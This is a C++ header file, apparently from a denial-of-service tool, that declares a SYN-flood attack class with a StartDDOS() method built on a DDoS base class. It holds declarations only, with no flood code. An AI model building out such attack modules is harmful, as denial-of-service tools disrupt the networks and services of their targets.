#ifndef __SDSYN_H__
#define __SDSYN_H__

#include "cstring.h"
#include "ddos.h"
#include "utility.h"

class CDDOSSDSyn : public CDDOSBase{
public:
	CDDOSSDSyn();
	virtual void StartDDOS();
};

#endif // __SDSYN_H__
